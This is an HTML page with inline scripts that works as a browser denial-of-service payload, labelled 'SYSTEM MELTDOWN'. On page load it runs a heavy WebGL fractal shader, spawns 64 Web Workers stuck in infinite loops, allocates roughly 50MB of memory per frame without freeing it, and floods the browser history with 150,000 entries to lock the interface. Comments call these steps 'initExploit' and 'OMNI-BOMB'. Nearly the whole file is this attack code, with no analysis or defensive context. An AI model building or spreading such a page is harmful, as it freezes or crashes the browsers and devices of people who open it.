<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>cvAI4 - SYSTEM MELTDOWN</title>
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; cursor: none; }
        canvas { width: 100vw; height: 100vh; display: block; filter: contrast(150%); }
        #status {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            color: #f00; font-family: 'Courier New', monospace; z-index: 100;
            pointer-events: none; text-shadow: 0 0 10px #f00; font-weight: bold;
        }
    </style>
</head>
<body>
    <div id="status">INJECTING OMNI-LAG...</div>
    <canvas id="cvAI4_Canvas"></canvas>

    <script id="vs" type="x-shader/x-vertex">
        attribute vec3 position;
        void main() { gl_Position = vec4(position, 1.0); }
    </script>

    <script id="fs" type="x-shader/x-fragment">
        precision highp float;
        uniform float time;
        uniform vec2 res;

        // KERNEL GABUNGAN (cznull + cvAI4 Overclock)
        float kernel(vec3 ver){
            // Volume Shader Logic
            float x = cos(1.0 / (ver.x * ver.x + 0.06));
            float y = cos(1.0 / (ver.y * ver.y + 0.06));
            float z = cos(1.0 / (ver.z * ver.z + 0.06));
            
            // Fractal Overload Logic (Mandelbulb-ish)
            vec3 a = ver;
            float b;
            for(int i=0; i<15; i++){ 
                b = length(a);
                a = pow(b, 4.0) * vec3(sin(a.x), cos(a.y), sin(a.z)) + ver;
                if(b > 10.0) break;
            }
            return -x-y-z-1.2 + (5.0 - length(a));
        }

        void main() {
            vec2 uv = (gl_FragCoord.xy * 2.0 - res) / min(res.x, res.y);
            vec3 color = vec3(0.0);
            
            // Heavy Ray-Marching loop
            for(int i=0; i<80; i++) {
                vec3 p = vec3(uv, sin(time * 0.1)) + float(i) * 0.02;
                float d = kernel(p);
                color += vec3(d * 0.1, d * 0.05, d * 0.2);
            }
            gl_FragColor = vec4(color, 1.0);
        }
    </script>

    <script>
        const canvas = document.getElementById('cvAI4_Canvas');
        const gl = canvas.getContext('webgl');
        const junk = [];

        function initExploit() {
            // Setup Program
            const prog = gl.createProgram();
            const create = (t, s) => {
                const sh = gl.createShader(t);
                gl.shaderSource(sh, s);
                gl.compileShader(sh);
                return sh;
            };

            gl.attachShader(prog, create(gl.VERTEX_SHADER, document.getElementById('vs').text));
            gl.attachShader(prog, create(gl.FRAGMENT_SHADER, document.getElementById('fs').text));
            gl.linkProgram(prog);
            gl.useProgram(prog);

            // Buffer
            const buf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,1,0, -1,-1,0, 1,1,0, 1,-1,0]), gl.STATIC_DRAW);
            const pos = gl.getAttribLocation(prog, "position");
            gl.enableVertexAttribArray(pos);
            gl.vertexAttribPointer(pos, 3, gl.FLOAT, false, 0, 0);

            const tLoc = gl.getUniformLocation(prog, "time");
            const rLoc = gl.getUniformLocation(prog, "res");

            // EXECUTION: OMNI-BOMB
            function render(t) {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                gl.viewport(0, 0, canvas.width, canvas.height);
                gl.uniform1f(tLoc, t * 0.001);
                gl.uniform2f(rLoc, canvas.width, canvas.height);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);

                // MEMORY PRESSURE (50MB per frame)
                for(let i=0; i<50; i++) {
                    junk.push(new Uint32Array(128000)); 
                }

                requestAnimationFrame(render);
            }

            // UI LOCK (History Flood)
            const lock = () => {
                let s = "";
                for(let i=0; i<150000; i++) {
                    s += i;
                    history.pushState(0,0,s);
                }
            };

            // CPU WORKERS
            const spawn = () => {
                for(let i=0; i<64; i++) {
                    new Worker(URL.createObjectURL(new Blob(["while(1){}"])));
                }
            };

            setTimeout(() => {
                document.getElementById('status').innerText = "SYSTEM_FAILURE: RESOURCE_EXHAUSTED";
                spawn();
                render(0);
                setTimeout(lock, 500);
            }, 1000);
        }

        window.onload = initExploit;
    </script>
</body>
</html>
